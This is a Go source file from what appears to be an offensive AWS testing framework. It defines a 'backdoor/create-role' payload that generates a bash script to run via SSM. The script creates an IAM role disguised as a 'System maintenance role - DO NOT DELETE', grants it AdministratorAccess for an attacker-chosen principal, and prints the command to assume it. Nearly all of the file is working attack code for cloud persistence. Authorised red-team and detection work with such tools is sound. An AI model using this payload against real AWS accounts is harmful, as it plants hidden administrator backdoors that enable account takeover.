// Unless explicitly stated otherwise all files in this repository are licensed under the Apache-2.0 License.
// This product includes software developed at Datadog (https://www.datadoghq.com/)
// Copyright 2026 Datadog, Inc.

package ssm

import (
	"fmt"
	"strings"

	"github.com/DataDog/pathrunner/pkg/modules"
	"github.com/DataDog/pathrunner/pkg/payloads"
)

// BackdoorCreateRolePayload creates an IAM role with administrator privileges using
// the instance role's IAM permissions.
type BackdoorCreateRolePayload struct{}

func init() {
	payloads.Register(&BackdoorCreateRolePayload{})
}

func (p *BackdoorCreateRolePayload) GetName() string {
	return "backdoor/create-role"
}

func (p *BackdoorCreateRolePayload) GetDescription() string {
	return "Create an IAM role with administrator privileges using the instance role's IAM permissions"
}

func (p *BackdoorCreateRolePayload) GetTags() []string {
	return []string{
		payloads.TagServiceSSM,
		payloads.TagLanguageBash,
		payloads.TagTechniqueBackdoor,
	}
}

func (p *BackdoorCreateRolePayload) GetOptions() []modules.Option {
	return []modules.Option{
		{
			Name:        "TRUST_PRINCIPAL",
			Description: "Trusted principal ARN (e.g. arn:aws:iam::123456789012:user/name) or service (e.g. lambda.amazonaws.com)",
			Required:    true,
		},
		{
			Name:        "ROLE_NAME",
			Description: "Name for the backdoor role (auto-generated if empty)",
			Required:    false,
			Default:     "",
		},
		{
			Name:        "EXTERNAL_ID",
			Description: "External ID condition for the trust policy",
			Required:    false,
			Default:     "",
		},
		{
			Name:        "ROLE_PATH",
			Description: "IAM path for the role",
			Required:    false,
			Default:     "/",
		},
	}
}

func (p *BackdoorCreateRolePayload) Validate(options map[string]string) error {
	if options["TRUST_PRINCIPAL"] == "" {
		return fmt.Errorf("TRUST_PRINCIPAL is required for backdoor/create-role payload")
	}
	return nil
}

func (p *BackdoorCreateRolePayload) GenerateCode(options map[string]string) (string, error) {
	trustPrincipal := options["TRUST_PRINCIPAL"]
	roleName := options["ROLE_NAME"]
	externalID := options["EXTERNAL_ID"]
	rolePath := options["ROLE_PATH"]
	if rolePath == "" {
		rolePath = "/"
	}

	principalKey := "AWS"
	if strings.HasSuffix(trustPrincipal, ".amazonaws.com") {
		principalKey = "Service"
	}

	roleNameBash := `ROLE_NAME="pathrunner-backdoor-$(date +%s)"`
	if roleName != "" {
		roleNameBash = fmt.Sprintf(`ROLE_NAME="%s"`, roleName)
	}

	externalIDCondition := ""
	if externalID != "" {
		externalIDCondition = fmt.Sprintf(`,
                "Condition": {
                    "StringEquals": {
                        "sts:ExternalId": "%s"
                    }
                }`, externalID)
	}

	script := fmt.Sprintf(`echo "Pathrunner: create-role"
echo "Trust principal: %s"

%s

TRUST_POLICY=$(cat <<'TRUSTPOLICY'
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": {
                "%s": "%s"
            },
            "Action": "sts:AssumeRole"%s
        }
    ]
}
TRUSTPOLICY
)

echo "Creating IAM role: $ROLE_NAME..."
CREATE_OUTPUT=$(aws iam create-role \
    --role-name "$ROLE_NAME" \
    --path "%s" \
    --assume-role-policy-document "$TRUST_POLICY" \
    --description "System maintenance role - DO NOT DELETE" \
    --max-session-duration 43200 2>&1)

if [ $? -ne 0 ]; then
    echo "FAILED: Could not create role: $CREATE_OUTPUT"
    exit 1
fi

ROLE_ARN=$(echo "$CREATE_OUTPUT" | grep -o '"Arn": "[^"]*"' | cut -d'"' -f4)
echo "Role created: $ROLE_ARN"

echo "Attaching AdministratorAccess policy..."
aws iam attach-role-policy \
    --role-name "$ROLE_NAME" \
    --policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"

if [ $? -eq 0 ]; then
    echo "SUCCESS: Role $ROLE_NAME created with AdministratorAccess"
    echo "Role ARN: $ROLE_ARN"
    echo "Assume command: aws sts assume-role --role-arn $ROLE_ARN --role-session-name pathrunner-session"
else
    echo "FAILED: Could not attach policy"
fi
`, trustPrincipal, roleNameBash, principalKey, trustPrincipal, externalIDCondition, rolePath)

	return script, nil
}

func (p *BackdoorCreateRolePayload) ProcessResult(result string) (string, error) {
	if result == "" {
		return "", nil
	}

	// Parse the role ARN printed by the bash script ("Role ARN: <arn>").
	var roleARN string
	for _, line := range strings.Split(result, "\n") {
		if strings.HasPrefix(strings.TrimSpace(line), "Role ARN: ") {
			roleARN = strings.TrimSpace(strings.TrimPrefix(strings.TrimSpace(line), "Role ARN: "))
			break
		}
	}

	if roleARN != "" {
		return fmt.Sprintf("%s\nNext steps:\n  use sts-001\n  set ROLE_ARN %s\n  exploit\n", result, roleARN), nil
	}
	return result, nil
}

// ReportSideEffects returns the created role as a tracked resource.
func (p *BackdoorCreateRolePayload) ReportSideEffects(options map[string]string) []modules.CreatedResource {
	roleName := options["ROLE_NAME"]
	if roleName == "" {
		roleName = "pathrunner-backdoor-<timestamp>"
	}

	return []modules.CreatedResource{
		{
			Type:          "iam:role",
			Name:          roleName,
			CleanupMethod: "iam:DeleteRole",
			Metadata: map[string]string{
				"trust_principal": options["TRUST_PRINCIPAL"],
				"role_path":       options["ROLE_PATH"],
			},
		},
	}
}
